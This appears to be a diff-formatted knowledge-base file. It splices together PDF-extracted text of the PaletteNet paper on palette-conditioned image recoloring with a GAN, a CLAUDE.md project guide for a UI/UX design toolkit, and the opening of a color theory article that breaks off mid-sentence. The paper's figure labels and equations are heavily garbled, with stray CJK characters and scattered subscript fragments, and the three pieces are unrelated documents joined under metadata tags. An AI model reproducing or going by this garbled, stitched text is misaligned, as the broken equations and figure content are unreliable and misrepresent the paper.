+However, it is questionable how well the color transform
+function [5, 3] in the palette space could be utilized for
+the content-aware recolorization. For example, flowers look
+## 62
+
+ResBlock1
+ResBlock2
+ResBlock3
+## Target Palette 가
+## "
+## Source Image
+## Feature Encoder
+content feature 瀀
+## 㰀
+## [가
+## "
+## , 瀀
+## 㰀
+## ]
+## [瀀
+## 䀀
+## ,琀
+## 㰀
+## ]
+## 瀀
+## 䠀
+## 瀀
+## 䐀
+## 瀀
+## 䀀
+## [가
+## "
+## , 瀀
+## 䐀
+## ,琀
+## 䀀
+## ]
+## [가
+## "
+## , 瀀
+## 䠀
+## ,琀
+## 䐀
+## ]
+## Recoloring Decoder
+## ...
+## 18
+## 18
+## / 16
+## ⠀/  16
+## 3××⠀
+## 512×
+## 
+## 16
+## ×
+## ⠀
+## 16
+## 512
+## Conv
+## Color Prediction
+## 2××⠀
+## 
+## 6
+## 됀
+## 89
+## 
+## 뀀
+## [
+## 뀀
+## ;
+## ,琀
+## 䠀
+## ]
+## Convolution
+## Concat
+## Deconvolution
+Figure 3.The Proposed Framework.PaletteNet has two subnets: Feature encoder network which extracts the content feature from the
+source image and recoloring decoder network which decodes the content feature and the target palette into the recolored output.
+more complicated than the sky. Accordingly, the recoloring
+of flowers necessitates more effort than the recoloring of
+the sky. Each of the objects has different color characteris-
+tics, and the simple palette matching recolorization neglects
+them. Moreover, performing color transformation globally
+on images might not be appropriate. For example, we might
+want the red tulip and the red bird in an image to be recol-
+ored separately to a yellow tulip and a green bird. Thus, it is
+natural to deploy a deep neural network that has strength in
+understanding the contents (tulips, bird, etc.) of the source
+image.
+In this paper, we propose a deep learning architecture
+for the content-aware image recoloring based on the given
+target palette. The proposed deep architecture requires two
+inputs, which are a source image and a target palette. As de-
+scribed in Figure 2, the output image is a recolored version
+of the source image with respect to the target palette. In our
+paper, the color palette contains six of the most representa-
+tive colors in an artwork. Six is minimal and still represen-
+tative enough to express analogous, monochromatic, triad,
+complementary, or compound combinations of colors. Al-
+though the spatial dimension of the palette is small, we as-
+sume the amount of information in the palette is abundant to
+express a specific color concept. To obtain a realistic recol-
+orized image with the given palette, we propose an encoder-
+decoder network and multi-task loss function composed of
+Euclidean loss and adversarial loss. To gather image and
+palette pairs to train the proposed network, we scraped the
+Design-seedswebsite [1] and created a dataset. Since the
+different color versions of an image do not usually exist,
+we propose the color augmentation method to expand the
+dataset for training the deep neural network. The proposed
+network is trained in an end-to-end and data-driven way. In
+the experiments, we show our model outperforms the exist-
+ing recolorization model and produces plausible results in a
+second, while a human expert takes 18 minutes on average.
+- Structure of PaletteNet
+Figure 3 depicts the overall structure of the proposed
+PaletteNet.  PaletteNet includes two subnets: feature en-
+coder (FE) and recoloring decoder (RD). The inputs of
+PaletteNet areI
+s
+, the source (s) image in LAB andP
+t
+, the
+target (t) palette. Target paletteP
+t
+of PaletteNet is the LAB
+color value of 18-dimensional vector, defined by the six
+representative colors. The output of PaletteNet is
+## ˆ
+## I
+ab
+t
+, the
+abchannel image, whoseab(color) is altered from source.
+Final output
+## ˆ
+## I
+t
+is formed by concatenating output of net-
+work
+## ˆ
+## I
+ab
+t
+and source image luminanceI
+## L
+s
+. Thus,I
+t
+has
+identical spatial size of the source image. In short, Palet-
+teNet changes color channel conditioned to fixed luminance
+value.
+FE in PaletteNet, which is fully convolutional neural net-
+work, is responsible to recognize contextual information of
+## I
+s
+and encode objects, texture, color as a content featurec.
+FE reduces the spatial size of each feature map in half by
+residual blocks [6]. It also outputs each intermediate hierar-
+## 63
+
+chical feature mapc
+i
+as the content feature. With a simple
+notation,
+## FE(I
+s
+## ) =c={c
+## 1
+## ,c
+## 2
+## ,c
+## 3
+## ,c
+## 4
+## }.(1)
+In RD of PaletteNet, the target paletteP
+t
+is combined
+with the content featurecto perform recolorization.  At
+first, RD takesc
+## 1
+andP
+t
+as an initial input. After repeat-
+ingP
+t
+spatially on every pixel ofc
+## 1
+to match the dimen-
+sions, the repeatedP
+t
+andc
+## 1
+are concatenated in depth,
+which denoted as as[P
+t
+## ,c
+## 1
+]. Then deconvolution (Deconv)
+layer upsamples[P
+t
+## ,c
+## 1
+## ]intod
+## 1
+. The Deconv operations
+are depicted with colored arrows in Figure 3 and the out-
+put of the operation with same color. The following De-
+conv layers upsample[c
+## 2
+## ,d
+## 1
+## ]intod
+## 2
+## ,[P
+t
+## ,c
+## 3
+## ,d
+## 2
+## ]intod
+## 3
+## ,
+## [P
+t
+## ,c
+## 4
+## ,d
+## 3
+## ]intod
+## 4
+in the same mechanism. Finally, a con-
+volution layer transforms[I
+## L
+s
+## ,d
+## 4
+]intoabcolor prediction,
+## ˆ
+## I
+ab
+t
+. The architecture with skip-connections from FE to RD
+is similar to U-net [11] which is powerful at segmentation
+tasks. Because recolorization depends massively on image
+content, RD uses the hierarchical content feature from FE,
+which encodes the spatial information of image. Since all
+the operations are differentiable, FE and RD can be trained
+jointly for encoding the contents and recoloring with the
+target palette. For fast convergence and stable learning, the
+non-linear function oftanhfollows after the final convolu-
+tion layer. Our PaletteNetGcan be denoted simply as:
+## G(I
+s
+## ,P
+t
+## ) =RD(FE(I
+s
+## ),P
+t
+)) =RD(c,P
+t
+## ) =
+## ˆ
+## I
+ab
+t
+## .
+## (2)
+Instance Normalization [13] layer follows all the convo-
+lution and deconvolution layers in FE and RD. LeakyReLU
+activation function is applied after the normalization layers.
+- Training of PaletteNet
+For training PaletteNet, there must be pairs of an image-
+palette(I
+j
+## ,P
+j
+). We defineNpairs of dataset asD
+orig
+## =
+## {(I
+j
+## ,P
+j
+)|j= 1, ..., N}. We need a source and a target
+image-palette pairs which has different color concept of
+## (I
+j
+## ,P
+j
+)in order to learn recoloring. Of course, different
+color version of an image usually does not exist. There-
+fore we generate more image-palette pairs from(I
+j
+## ,P
+j
+## )
+through the proposed color augmentation method. The de-
+tailed color augmentation step is explained in Section 4.1.
+We generate training data tuple(I
+s
+## ,P
+t
+## , I
+t
+)from(I
+j
+## ,P
+j
+## )
+through color augmentation. PaletteNet acceptsI
+s
+andP
+t
+as inputs, and learns to recolor output
+## ˆ
+## I
+t
+with chromaticity
+ofP
+t
+## .
+PaletteNet is trained by optimizing two loss functions:
+Euclidean loss (E-loss,L
+## E
+) and Adversarial loss (Adv-loss,
+## L
+## Adv
+). Training has two phases and is depicted in Figure 4.
+The first phase is pretraining FE and RD with E-loss. In
+this process, FE learns how to extract the content feature of
+## FE
+## �
+## 
+## 뀀
+## 가
+## 됀
+## 
+## &
+## 됀
+## '(
+## 瀀
+## 
+## 됀
+## '(
+## (
+## ꀀ
+## , 가
+## ꀀ
+## )~ఀ
+## 0123
+## E-loss
+real?
+fake?
+## RD
+## DN
+real?
+fake?
+- Pretrain FE + RD
+with E-loss
+- Train RD with
+## E-loss + Adv-loss
+## 가
+## 됀
+concat
+## 
+## 뀀
+## 4
+## �
+## 
+## &
+## 됀
+## Adv-loss
+Figure 4. The training PaletteNet involves two phases: 1. Pretrain
+FE and RD with E-loss (Section 3.1), 2. Freeze the parameters of
+FE and train RD with additional Adv-loss (Section 3.2). This split
+training stables learning recolorization process with Adv-loss. See
+how to compose the training data tuple in Section 3.3.
+the image and RD learns how to recolorize with the con-
+tent feature and the given target palette. E-loss trainsGby
+minimizing pixel-wise distance between
+## ˆ
+## I
+t
+andI
+t
+## .
+However with E-loss,Gonly learns the color augmented
+relation betweenI
+s
+andI
+t
+. Color augmentation is an es-
+sential means of generating different color versions of an
+image, but not the ultimate function to learn. Therefore in
+second phase, we introduce additional loss term, Adv-loss
+to trainGto generate more realistic images likeI
+j
+## ∈D
+orig
+## ,
+instead of learning the color augmented relations. Adv-loss
+is first proposed from GAN [4], which is a promising frame-
+work for generating realistic images. GAN adopts two neu-
+ral networks, the discriminator network and the generator
+network.  The discriminator network is trained to distin-
+guish natural images and generated image by the genera-
+tor network. On the other hand, the generator network is
+trained to produce images that are indistinguishable from
+natural images by the discriminator network. This competi-
+tive training against each other trains the generator network
+to output realistic images. But if either one of the discrim-
+inator network and generator network becomes too power-
+ful, the competitive learning breaks and the other one fails
+to learn from the powerful opponent. Since our PaletteNet
+Ghas lots of parameters, applying GAN framework from
+the beginning of train happens to be a trouble. Thus as de-
+picted in Figure 4, we pretrain FE and RD enough with E-
+loss at first phase and adopt Adv-loss at second phase to
+train RD and the discriminator networkD.
+3.1. Pretraining of FE and RD with E-loss
+With E-loss, update the parameters ofG(FE and RD) so
+that the Euclidean Norm between the output of PaletteNet
+## G(I
+s
+## ,P
+t
+## ) =
+## ˆ
+## I
+ab
+t
+and desiredabimageI
+ab
+t
+minimizes. E-
+## 64
+
+loss will be as followed:
+## L
+## E
+## =
+## H
+## ∑
+## W
+## ∑
+## (
+## ˆ
+## I
+ab
+t
+## −I
+ab
+t
+## )
+## 2
+## ,(3)
+whereH, Ware height and width of an image and pixel
+(x, y) is abbreviated. We overlay the source image lumi-
+nanceI
+## L
+s
+on
+## ˆ
+## I
+ab
+t
+and denote the final output LAB image as
+## ˆ
+## I
+t
+## .
+As E-loss forcesGto learn the color augmented relation
+betweenI
+s
+andI
+t
+, we use it only for pretraining FE and
+RD. We pretrainGuntil value ofL
+## E
+converges on training
+set.
+3.2. Training of RD with Adv-loss
+Our proposed Discriminator NetworkDaccepts an im-
+ageIand a palettePand classifies if the pair(I,P)is re-
+lated. Therefore, the purpose ofGis to generate the output
+## ˆ
+## I
+t
+to have the color concept ofP
+t
+.Daccepts the pair(I,P)
+by replicatingPspatially and concatenating in depth toI,
+which is identical operation[I,P]explained in RD archi-
+tecture.Dof original GAN [4] views an output ofGas
+fake, a sample from target data asreal. OurDperforms
+binary classification on a pair(I,P)so thatD
+fake
+(I,P)is
+the probability of the pair classified asfake(unrelated), and
+## D
+real
+(I,P)is the probability of the pair classified asreal
+(related). The summation of the two probabilities is equal
+to 1.
+In our adversarial network architecture,GandDare op-
+timized to solve the following min-max problem:
+min
+## G
+max
+## D
+## E
+## (I
+## 1
+## ,P
+## 1
+## )∼P
+real
+[logD
+real
+## (I
+## 1
+## ,P
+## 1
+## )]
+## +E
+## (I
+## 2
+## ,P
+## 2
+## )∼P
+fake
+[logD
+fake
+## (I
+## 2
+## ,P
+## 2
+## )],
+## (4)
+where(I
+## 1
+## ,P
+## 1
+)is afakepair and(I
+## 2
+## ,P
+## 2
+)is arealpair. To
+be more specific, ourDviews a pair of network generated
+image and target palette(
+## ˆ
+## I
+t
+## ,P
+t
+)asfakeand a randomly
+sampled pair(I
+o
+## ,P
+o
+## )∈D
+orig
+, which are genuine dataset
+and not color augmented, asreal:
+## D
+real
+## (I
+o
+## ,P
+o
+## ) = 1,D
+fake
+## (
+## ˆ
+## I
+t
+## ,P
+t
+## ) = 1.(5)
+But practically, the size ofD
+orig
+is too small and causes
+Dto cheat by memorizing all the pairs(I
+o
+## ,P
+o
+## )∈D
+orig
+## .
+As a matter of fact, whenGgenerates recolored
+## ˆ
+## I
+t
+com-
+paratively well with the color concept ofP
+t
+,Dbarely ob-
+serves the pair(I,P)having entirely different color con-
+cept. Therefore,Dfinds it very hard to discriminate be-
+tween(I
+o
+## ,P
+o
+## )and(
+## ˆ
+## I
+t
+## ,P
+t
+), eventually tries to cheat by
+memorizing(I
+o
+## ,P
+o
+). We experimentally observedDper-
+forming strikingly well and not easily fooled ever after 1
+epoch trainingDonD
+orig
+. Therefore following classifica-
+tion term is added to preventDfrom cheating:
+## D
+fake
+## (I
+o
+## ,P
+t
+## ) = 1,D
+fake
+## (
+## ˆ
+## I
+t
+## ,P
+o
+## ) = 1.(6)
+The two terms prevent cheating ofDby classifying the un-
+related pairs asfake. They are crucial to induce well bal-
+anced training ofGandD, no longer causing too powerful
+D. The classification loss ofDis calculated as:
+## L
+## D
+=−E[logD
+fake
+## (
+## ˆ
+## I
+t
+## ,P
+t
+)]−E[logD
+fake
+## (I
+o
+## ,P
+t
+## )]
+−E[logD
+fake
+## (
+## ˆ
+## I
+t
+## ,P
+o
+)]−E[logD
+real
+## (I
+o
+## ,P
+o
+## )].
+## (7)
+And the Adv-loss to trainG(specifically RD) is calculated
+as:
+## L
+## Adv
+=−E[logD
+real
+## (
+## ˆ
+## I
+t
+## ,P
+t
+## )].(8)
+Finally, the total loss function ofGis the weighted sum
+of the E-loss and the Adv-loss:
+## L
+## G
+=λL
+## E
+## +L
+## Adv
+## ,(9)
+whereλis a weighting parameter between the two losses
+which has been set to 10 in our work. We optimizeL
+## D
+and
+## L
+## G
+together at each iteration and stop training via valida-
+tion.
+## 3.3. Training Data Composition
+Here, we explain how we prepare the training data tu-
+ple(I
+s
+## ,P
+t
+## , I
+t
+)while training FE and RD with E-loss. Ini-
+tially, we have the original image-palette datasetD
+orig
+## =
+## {(I
+j
+## ,P
+j
+)|j= 1, ..., N}. We perform color augmentation
+on eachjth image-palette(I
+j
+## ,P
+j
+)pair intoN
+a
+number of
+different image-palette pairs.  Then, we denote the aug-
+mented image set asI
+j
+## ={I
+## (j,n)
+## |n= 1, ..., N
+a
+}and the
+corresponding augmented palette set asP
+j
+## ={P
+## (j,n)
+## |n=
+## 1, ..., N
+a
+}. WithinI
+j
+## ,P
+j
+, we randomly sample two pairs,
+the source pair(I
+s
+## ,P
+s
+)and the target pair(I
+t
+## ,P
+t
+). A train-
+ing data tuple is a source imageI
+s
+, a target paletteP
+t
+, and a
+target imageI
+t
+. We do not use the source paletteP
+s
+during
+training unlike the previous palette matching methods [3, 5].
+The total number of possible training data tuples(I
+s
+## ,P
+t
+## , I
+t
+## )
+isN
+a
+## ×N
+a
+×N. In addition, the source pair and the target
+pair can be identical. In this case, PaletteNet reconstructs
+the input image with its palette like Auto-encoder model.
+When it comes to training with Adv-loss, we additionally
+sample(I
+o
+## ,P
+o
+)fromD
+orig
+. Thus, the training data tuple
+to trainGandDtogether is(I
+s
+## ,P
+t
+## , I
+t
+## , I
+o
+## ,P
+o
+## ). Training
+also includes random horizontal flip of the images in the
+probability of 0.5.
+## 4. Experiments
+4.1. Data Preparation and Color Augmentation
+We generate the dataset using 1,611 image-palette pairs
+scrapped from theDesign-seeds.com[1] website.  Since
+we train PaletteNet to change a source image into a tar-
+get image, we need a target ground truth image, which is
+## 65
+
+Figure 5.The Proposed Color Augmentation and Naive Hue-
+shift method(a) the original image (b) the result of the proposed
+color augmentation (c) the result of the naive hue-shift by +180.
+Compared to (c), (b) alters the color concept only, retaining the
+luminance. (c) distorts the luminance from the original image.
+the different-colored version of the source image.  How-
+ever, a different-colored version of a specific image gen-
+erally does not exist. Therefore, color augmentation is an
+essential step to define the input and output of our network.
+Color augmentation means altering channel-wise pixel val-
+ues of an image in a certain color space, like HSV, RGB,
+and LAB. We mainly use hue-shift in the HSV color space.
+The naive color augmentation shifts the hue value of an im-
+age between 1 and 360 in HSV. The problem is that hue-
+shift causes a luminance distortion to the image. Since HSV
+does not separate luminance as the characteristics of color,
+the naive way causes the luminance distortion. Figure 5
+(c) clearly shows that the naive hue-shift distorts luminance
+from original image (a). Thus, we reinforce the naive hue-
+shift algorithm with the LAB color space, which is known
+to best express an image’s luminance:
+RGB→LABand cacheL
+## RGB→HSV
+hue−shift
+## −−−−−−−→H
+## ∗
+## SV→L
+## ∗
+## A
+## ∗
+## B
+## ∗
+Final hue-shifted image:LA
+## ∗
+## B
+## ∗
+## .
+## (10)
+The above procedure describes the proposed hue-shift algo-
+rithm. The main idea is fixing the luminance of an orig-
+inal image during color augmentation. As shown in Fig-
+ure 5 (b), it successfully alters color concept only while
+the less luminance distortion occurs than the naive hue-
+shift algorithm. Fixing luminance is important because we
+aim only to change the color concept. We assume that the
+corresponding palette of the hue-shifted image is also hue-
+shifted by the same amount from the palette of the original
+image. We augmented each image-palette pair(I
+j
+## ,P
+j
+## )18
+times (step of 20 in 360) with the proposed color augmenta-
+tion method. We split 1,611 image-palette pairs into 1,561
+as the training set and 50 as the validation set, resulting in
+28,098 training pairs and 900 validation pairs. Finally, we
+resized the images into288×432to keep a constant input
+size for the neural network.
+4.2. Training and Architecture Details
+We trained networks using NVIDIA GTX TitanX and
+GTX 1080 GPUs. Because of the image resolution288×
+432is relatively large compared to general image recogni-
+tion models, we used a small mini-batch size of 12 at GTX
+TitanX and 8 at GTX 1080 not to exceed GPU memory.
+We used the Adam optimizer [8] while trainingGandD.
+Most of the hyper-parameters are from DCGAN [10]. The
+learning rate was set to 0.0002 andβ
+## 1
+as 0.5.
+The values of LAB images range:Lin [0, 100],ain
+[-86.185, 98,254], andbin [-107.863, 94.482]. For better
+input format, we normalized each channel to be the range
+in [-1, 1] by linear transforms. We used a palettes in LAB
+and normalized in the same way as above.
+The most famous normalization is Batch Normaliza-
+tion [7]. Applying Batch Normalization has been seemed
+mandatory in recent deep neural network architectures. It
+helps training the model faster by normalizing a whole
+mini-batch and acting like a regularizer. However, some
+of image generation tasks show that alternative normaliza-
+tion, Instance Normalization (also called Contrast Normal-
+ization) [13], enhances generated images. It was first pro-
+posed in TextureNet [12] and reported enhanced styliza-
+tion performance, even with a desaturated input images.
+Instance Normalization performs normalization at each in-
+stance of a mini-batch rather than throughout the mini-batch
+as Batch Normalization. In our recolorization task, we want
+each instance of mini-batch not interfered by different satu-
+rations of the others. We used Instance Normalization as it
+enhanced our recolorization significantly.
+Empirically, the last layer as the convolution was better
+at generalization on the validation set compared to the de-
+convolution. Moreover, initializing FE without bias and RD
+with bias were the best choice through the validation.
+Because we aim to recoloring artwork, we set our input
+size toH×Wof PaletteNet very large as432×288. We
+have tested various architectures ofDfor stable learning.
+Our final architecture ofDis 2-strided4×4fully convolu-
+tional network of 4 layers. Thus, the output ofDis binary
+heat-map with a spatial size ofH/16×W/16. Instance Nor-
+malization and LeakyReLU follow each convolution layer
+ofD.
+## 4.3. Palette Generalization
+To evaluate the generalization performance of the pro-
+posed method, we tested on the validation images set with
+the randomly sampled target palettes. If the model is well
+generalized, the output images are recolored according to
+the color concept of the any arbitrary target palettes. Fig-
+ure 6 shows the results of the generalization experiment.
+Sometimes, the source image is monochromatic, while the
+target palette is complementary as the first row in Figure 6.
+Alternatively, the source image is variegated, and the target
+## 66
+
+## (a)(b)(c)
+Figure 6. The results of PaletteNet generalization on the randomly
+sampled image-palette pair. (a) source image (c) target palette (b)
+resulted output
+palette is desaturated as the second row in Figure 6. Dif-
+ferent characteristics between a source image and a target
+palette do not happen while training, because source and
+target image-palette pairs are color augmented and share
+similar characteristics of the color distribution.  Accord-
+ingly, for the givenI
+s
+, there are onlyN
+a
+training data tuples
+## (I
+s
+## ,P
+t
+## , I
+t
+).  However, our model can generalize even in
+those random cases as shown in Figure 6 (c). In the first row
+of the figure, PaletteNet recolors flowers with yellow and
+blue, while the source image flowers were monochromatic
+orange. In the second row of the figure, PaletteNet accepts
+a desaturated palette and recolors the variegated source im-
+age in a desaturated fashion. These new generated outputs
+(c) in Figure 6 cannot be recolored by color augmentation,
+which proves our proposed model learns the generalized re-
+colorization process with a given palette.
+## (a)(b)(c)(d)
+Figure 7. (a) Control on the 2nd color of the target palette and (b)
+resulted output. (c) Control on the 5th color of the target palette
+and (d) resulted output.
+## 4.4. Palette Control
+PaletteNet does not accept color hints for specific pixel
+locations like [2].  The model must deduce where to re-
+color with which color in the target palette. To discover
+how the colors of palette affect the recoloring process, we
+conducted an experiment which we control one color while
+other colors in the palette are fixed on a given image. Fig-
+ure 7 shows that the second color of the palette presumably
+colors the overall tone of the flowers, while the fifth color of
+the palette colors background leaves, while fixing the flower
+bud in pink. These results also prove that PaletteNet is not
+learning color augmentation relations but interprets the tar-
+get palette and reflects on the recolored output.
+## 4.5. Comparisons
+In this section, we evaluated PaletteNet by comparing
+with the previous color transfer function method [3] and
+the human expert. As shown in Figure 8, (e) by PaletteNet
+shows more realistic results compared to (d) by [3]. There
+are several differences between [3] and PaletteNet. First,
+[3] takes the source paletteP
+s
+, which ours does not need.
+Second, [3] cannot accept a user-favored target palette ex-
+plicitly, but the user must adjust the source palette interac-
+## 67
+
+## (a)(b) (c)(d)(e)
+Figure 8. Compare with the existing recolorization model. (a) source image (b) source palette (c) target palette (d) Changet al. [3] (e)
+Proposed method. Our method do not use the source palette (b). (b) is only used in method (d).
+tively through the GUI. Each time an user adjust a color of
+the palette, the other colors in the palette are altered in re-
+sponse to calculate suitable color transform function. Palet-
+teNet directly accepts any arbitrary target palette. Third, [3]
+modifies the source image by a transfer function defined by
+the association of the source palette and the altered palette.
+Thus, the transfer function acts independently of pixel lo-
+cations and image context but recolors the source image
+globally. On the other hand, PaletteNet associates the target
+palette and the image content feature and infers which pixel
+to recolor with which color in a data-driven manner.
+Because the recolorization setting between [3] and ours
+differs, in Figure 8, we first applied [3] on the source im-
+age (a) by adjusting the source palette (b) to the palette (c),
+and the corresponding recolored outputs by color the color
+transfer function are (d). In comparison with our method,
+we used the pairs of the source image (a) and the palette
+(c) as the target palette, and the corresponding recolored
+outputs are (e). Our results (e) look more realistic com-
+pared to the results of [3] (d). The color transfer function
+method is vulnerable to a large-scaled adjustment of the
+source palette. In addiction, defining the source palette and
+adjusting it to the target palette require much user efforts
+and affect recolorization performance. Our method mini-
+mizes user effort by explicitly designating the target palette
+and gains realistic results.
+## 68
+
+## (a)(b)  (c)(d)(e)(f)
+Figure 9. Compare on the extreme target palette on a single image. (a) source image (b) source palette (c) target palette (d) Changet al. [3]
+(e) Proposed method (f) Human expert with Adobe Photoshop. (b) is only used in (d).
+We tested more extreme target palettes on a single im-
+age. In this case, professional designers also struggle to ad-
+just an image for an extreme target palette. Recolorization
+is a common task for designers to post-process color tone
+of their work. To compare our model against a designer in
+terms of time and quality, we asked a designer, who is an
+expert with the commercial software Adobe Photoshop to
+recolor a source image with a given target palette. We in-
+cluded the Adobe expert’s results and compared them with
+[3] and PaletteNet in Figure 9.
+The easiest way to recolor an image using Photoshop is
+to tweak the RGB color curve until one is satisfied with the
+color tone of the image. However, tweaking the RGB curve
+recolors an image globally like color transfer function with-
+out considering the image’s content. Thus, the human ex-
+pert additionally segmented objects like flowers, leaves, and
+background as paths, creating layers for each object path
+and recoloring them with a brush tool rather than tweaking
+the color curve. This local content-aware recoloring pro-
+cedure of the human expert costs lots of time but presents
+the best recoloring results. PaletteNet performs similar pro-
+cedure of human expert: extracting the content feature and
+recoloring with target palette conditioned to the content fea-
+ture. The human expert’s results are in Figure 9 (f). The
+human expert took each 16, 17, and 20 minutes on each
+result of 3 rows. Our proposed method in (e) again outper-
+forms color transformation function method (d). PaletteNet
+produces the plausible results compared to those of human
+experts, and each takes less than a second.
+## 5. Conclusion
+We have proposed PaletteNet that automatically recolors
+an image with a given target color palette. Contrary to re-
+colorization by the existing method using a color transfer
+function, PaletteNet extracts the content features and com-
+bines them with the target palette to perform content-aware
+recolorization in a data-driven way. As shown in the ex-
+periments, it is practically meaningful that PaletteNet out-
+performs the existing recolorization method and has an ex-
+cellent ability comparable to human experts in generating
+recolored images. Furthermore, PaletteNet could make a
+realistic and plausible image in less than a second, while a
+human expert using Adobe Photoshop takes 18 minutes on
+average for the corresponding recoloring work.
+## Acknowledgement
+This work was supported by Institute for Information
+& communications Technology Promotion (IITP) grant
+funded by the Korea government (MSIP) (2014-0-00059,
+Development of Predictive Visual Intelligence Technology)
+and the Brain Korea 21 Plus Project.  We also appreci-
+ate Hannah Park for the expert recolorization works with
+## Adobe Photoshop.
+## 69
+
+## References
+[1] Design seeds - for all who love color.http://
+design-seeds.com/. Accessed: 2017-04-24.
+[2] W. Casaca, M. Colnago, and L. G. Nonato. Interactive im-
+age colorization using laplacian coordinates. InInternational
+Conference on Computer Analysis of Images and Patterns,
+pages 675–686. Springer, 2015.
+[3] H. Chang, O. Fried, Y. Liu, S. DiVerdi, and A. Finkel-
+stein.  Palette-based photo recoloring.ACM Transactions
+on Graphics, 34(4):139:1–139:11, 2015.
+[4] I. Goodfellow, J. Pouget-Abadie, and M. Mirza. Generative
+Adversarial Networks.arXiv preprint arXiv: . . ., pages 1–9,
+## 2014.
+[5] G. R. Greenfield and D. H. House. Image recoloring induced
+by palette color associations.Journal of WSCG, 11(1):189—
+## -196, 2003.
+[6] K. He, X. Zhang, S. Ren, and J. Sun. Deep residual learn-
+ing for image recognition.arXiv preprint arXiv:1512.03385,
+## 2015.
+[7] S. Ioffe and C. Szegedy. Batch normalization: Accelerating
+deep network training by reducing internal covariate shift.
+arXiv preprint arXiv:1502.03167, 2015.
+[8] D. Kingma and J. Ba. Adam: A method for stochastic opti-
+mization.arXiv preprint arXiv:1412.6980, 2014.
+[9] G. R. Kuhn, M. M. Oliveira, and L. A. Fernandes. An ef-
+ficient naturalness-preserving image-recoloring method for
+dichromats.IEEE transactions on visualization and com-
+puter graphics, 14(6):1747–1754, 2008.
+[10] A. Radford, L. Metz, and S. Chintala. Unsupervised repre-
+sentation learning with deep convolutional generative adver-
+sarial networks.arXiv preprint arXiv:1511.06434, 2015.
+[11] O. Ronneberger, P. Fischer, and T. Brox. U-net: Convolu-
+tional networks for biomedical image segmentation. InIn-
+ternational Conference on Medical Image Computing and
+Computer-Assisted Intervention, pages 234–241. Springer,
+## 2015.
+[12] D. Ulyanov, V. Lebedev, A. Vedaldi, and V. Lempitsky. Tex-
+ture networks: Feed-forward synthesis of textures and styl-
+ized images.arXiv preprint arXiv:1603.03417, 2016.
+[13] D. Ulyanov, A. Vedaldi, and V. Lempitsky. Instance normal-
+ization: The missing ingredient for fast stylization.arXiv
+preprint arXiv:1607.08022, 2016.
+## 70
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd]
+
+### 📘 KNOWLEDGE: NEXUS_CLAUDE.MD
+
+# CLAUDE.md
+> **VERSION**: v2 | **Last Updated**: 26/05/2026
+
+
+
+This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.
+
+## Project Overview
+
+Antigravity Kit is an AI-powered design intelligence toolkit providing searchable databases of UI styles, color palettes, font pairings, chart types, and UX guidelines. It works as a skill/workflow for AI coding assistants (Claude Code, Windsurf, Cursor, etc.).
+
+## Search Command
+
+```bash
+python3 src/ui-ux-pro-max/scripts/search.py "<query>" --domain <domain> [-n <max_results>]
+```
+
+**Domain search:**
+- `product` - Product type recommendations (SaaS, e-commerce, portfolio)
+- `style` - UI styles (glassmorphism, minimalism, brutalism) + AI prompts and CSS keywords
+- `typography` - Font pairings with Google Fonts imports
+- `color` - Color palettes by product type
+- `landing` - Page structure and CTA strategies
+- `chart` - Chart types and library recommendations
+- `ux` - Best practices and anti-patterns
+
+**Stack search:**
+```bash
+python3 src/ui-ux-pro-max/scripts/search.py "<query>" --stack <stack>
+```
+Available stacks: `html-tailwind` (default), `react`, `nextjs`, `astro`, `vue`, `nuxtjs`, `nuxt-ui`, `svelte`, `swiftui`, `react-native`, `flutter`, `shadcn`, `jetpack-compose`
+
+## Architecture
+
+```
+src/ui-ux-pro-max/                # Source of Truth
+├── data/                         # Canonical CSV databases
+│   ├── products.csv, styles.csv, colors.csv, typography.csv, ...
+│   └── stacks/                   # Stack-specific guidelines
+├── scripts/
+│   ├── search.py                 # CLI entry point
+│   ├── core.py                   # BM25 + regex hybrid search engine
+│   └── design_system.py          # Design system generation
+└── templates/
+    ├── base/                     # Base templates ([skill-content.md](../security/NEXUS_SKILL-CONTENT.MD), [quick-reference.md](../security/NEXUS_QUICK-REFERENCE.MD))
+    └── platforms/                # Platform configs (claude.json, cursor.json, ...)
+
+cli/                              # CLI installer (uipro-cli on npm)
+├── src/
+│   ├── commands/init.ts          # Install command with template generation
+│   └── utils/template.ts         # Template rendering engine
+└── assets/                       # Bundled assets (~564KB)
+    ├── data/                     # Copy of src/ui-ux-pro-max/data/
+    ├── scripts/                  # Copy of src/ui-ux-pro-max/scripts/
+    └── templates/                # Copy of src/ui-ux-pro-max/templates/
+
+.claude/skills/ui-ux-pro-max/     # Claude Code skill (symlinks to src/)
+.factory/skills/ui-ux-pro-max/   # Droid (Factory) skill (symlinks to src/)
+.shared/ui-ux-pro-max/            # Symlink to src/ui-ux-pro-max/
+.claude-plugin/                   # Claude Marketplace publishing
+```
+
+The search engine uses BM25 ranking combined with regex matching. Domain auto-detection is available when `--domain` is omitted.
+
+## Sync Rules
+
+**Source of Truth:** `src/ui-ux-pro-max/`
+
+When modifying files:
+
+1. **Data & Scripts** - Edit in `src/ui-ux-pro-max/`:
+   - `data/*.csv` and `data/stacks/*.csv`
+   - `scripts/*.py`
+   - Changes automatically available via symlinks in `.claude/`, `.factory/`, `.shared/`
+
+2. **Templates** - Edit in `src/ui-ux-pro-max/templates/`:
+   - `base/[skill-content.md](../security/NEXUS_SKILL-CONTENT.MD)` - Common SKILL.md content
+   - `base/[quick-reference.md](../security/NEXUS_QUICK-REFERENCE.MD)` - Quick reference section (Claude only)
+   - `platforms/*.json` - Platform-specific configs
+
+3. **CLI Assets** - Run sync before publishing:
+   ```bash
+   cp -r src/ui-ux-pro-max/data/* cli/assets/data/
+   cp -r src/ui-ux-pro-max/scripts/* cli/assets/scripts/
+   cp -r src/ui-ux-pro-max/templates/* cli/assets/templates/
+   ```
+
+4. **Reference Folders** - No manual sync needed. The CLI generates these from templates during `uipro init`.
+
+## Prerequisites
+
+Python 3.x (no external dependencies required)
+
+## Git Workflow
+
+Never push directly to `main`. Always:
+
+1. Create a new branch: `git checkout -b feat/...` or `fix/...`
+2. Commit changes
+3. Push branch: `git push -u origin <branch>`
+4. Create PR: `gh pr create`
+
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, vcs]
+
+### 📘 KNOWLEDGE: NEXUS_COLOR_THEORY_AND_DESIGN.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+## Overview
+Color theory and design
+## Edward Wegman
+## ∗
+and Yasmin Said
+In this article, we discuss color theory and design with emphasis on use in
